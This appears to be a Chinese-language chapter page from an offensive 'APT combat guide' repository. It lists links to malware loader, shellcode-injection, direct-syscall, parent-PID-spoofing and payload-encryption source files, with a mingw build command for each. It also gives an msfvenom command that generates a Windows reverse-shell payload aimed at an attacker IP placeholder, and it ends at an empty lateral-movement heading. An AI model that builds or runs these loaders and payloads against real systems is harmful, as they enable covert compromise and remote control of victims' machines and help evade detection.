## 加载器

### 下载远程恶意文件

[wolf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/wolf.cpp)

```bash
x86_64-w64-mingw32-g++ -shared -o wolf.dll wolf.cpp -fpermissive
```

[download.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/download.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 download.cpp -o download.exe -mconsole -lwininet -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```bash
.\download.exe 进程PID
```

### Shellcode加载

1. EnumDesktopsA函数

```bash
msfvenom -p windows/x64/messagebox TEXT="Hello, World" -f c
```

[enumdesktopa.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/enumdesktopa.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 enumdesktopa.cpp -o enumdesktopa.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
````

2. EnumChildWindows函数

[ecw.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/ecw.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 ecw.cpp -o ecw.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

3. Listplanting函数

[llcalc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/llcalc.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 llcalc.cpp -o llcalc.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

4. EnumerateLoadedModules函数

[elm.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/elm.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 elm.cpp -o elm.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -ldbghelp
```

## 系统调用

[sycall.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/sycall.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 sycall.cpp -o sycall.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 枚举进程并注入

### 单独枚举进程

[枚举进程.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/枚举进程.cpp)


### NtGetNextProcess函数

[ngnp.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/ngnp.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 ngnp.cpp -o ngnp.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwap
```

### WTSEnumerateProcesses函数

[wtsep.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/wtsep.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 wtsep.cpp -o wtsep.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwap
```

## 父进程PID欺骗

### explorer进程

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP地址 LPORT=4444 -f c
```

[exp.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%88%B6%E8%BF%9B%E7%A8%8BPID%E6%AC%BA%E9%AA%97/exp.cpp)

### 自定义父进程

[custom.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%88%B6%E8%BF%9B%E7%A8%8BPID%E6%AC%BA%E9%AA%97/custom.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 custom.cpp -o custom.exe -mwindows -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 互斥锁

[mutex.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BA%92%E6%96%A5%E9%94%81/mutex.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mutex.cpp -o mutex.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 代码混淆和加密

### 混淆技术

1. 重命名

[script.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/script.py)

```bash
python script.py example.txt old new
```

2. 控制流混淆

(1)条件控制流混淆

[number.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/number.py)

[tj.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/tj.py)

(2)控制流平坦化

[cff.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/cff.py)

```bash
pip install astor
```

[flatten.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/flatten.py)

```bash
python flatten.py cff.py
```

(3)不透明谓词

[example.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/example.py)

[op.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/op.py)

### 加密技术

1. XOR加密

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f raw -o evil.bin
```

[xor_encode.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/xor_encode.py)

[xor.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/xor.cpp)

```bash
x86_64-w64-mingw32-gcc xor.cpp -o xor.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc >/dev/null 2>&1
```

2. Z85加密

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f c
```

[z85_encode.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/z85_encode.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 z85_encode.cpp -o z85_encode.exe -I/usr/share/mingw-w64/include/ -I/usr/include/z85/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

[z85.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/z85.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 z85.cpp -o z85.exe -I/usr/share/mingw-w64/include/ -I/usr/include/z85/ -L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

3. RC5加密

[rc5.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/rc5.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 rc5.cpp -o rc5.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

4. RC6加密

[rc6.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/rc6.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 rc6.cpp -o rc6.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

5. DES加密

[des.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/des.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 des.cpp -o des.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

6. TEA加密

[tea.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/tea.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 tea.cpp -o tea.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

7. XTEA加密

[xtea.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/xtea.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 xtea.cpp -o xtea.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

8. Madryga加密

[madryga.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/madryga.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 madryga.cpp -o madryga.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

9. A5/1算法

[a5.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/a5.cpp)

```bash
86_64-w64-mingw32-gcc -O2 a5.cpp -o a5.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

10. Skipjack加密

[skipjack.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/skipjack.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 skipjack.cpp -o skipjack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

11. WAKE加密

[wake.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/wake.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 wake.cpp -o wake.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

12. SAFER加密

[safer.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/safer.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 safer.cpp -o safer.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

13. LOKI加密

[loki.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/loki.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 loki.cpp -o loki.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

14. Khufu加密

[khufu.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/khufu.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 khufu.cpp -o khufu.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

15. CAST-128加密

[cast.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/cast.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 cast.cpp -o cast.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

16. FEAL-8加密

[feal.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/feal.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 feal.cpp -o feal.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

17. 模乘运算加密

[mc_encode.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/mc_encode.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mc_encode.cpp -o mc_encode.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

[mc_encode.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/mc_encode.py)

[mc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/mc.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mc.cpp -o mc.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 横向移动
